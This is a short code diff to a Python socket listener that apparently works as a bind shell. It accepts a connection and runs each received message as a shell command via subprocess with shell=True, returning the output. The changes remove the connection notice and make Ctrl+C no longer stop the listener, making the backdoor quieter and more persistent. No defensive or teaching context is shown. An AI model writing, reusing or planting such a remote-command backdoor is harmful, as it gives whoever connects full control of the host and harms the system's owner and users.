@@ -12,13 +12,13 @@ s.listen(1)
 connection, address = s.accept()
 
 
-print(f"connected established with {address} at port {port}")
-
 while True:
 	try:
 		data = connection.recv(1024)
-		print(data.decode('utf-8'))
-		command_response = str(subprocess.run([data.decode('utf-8').split(" ")], capture_output=True))
-		connection.sendall(command_response.encode())
+		data = data.decode('utf-8')
+		data = data.split(" ")
+		command_response = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+		command_response = str(command_response.stdout.read()) + " " + str(command_response.stderr.read())
+		connection.send(command_response.encode())
 	except KeyboardInterrupt:
-        	print("Bye...")
+        	continue
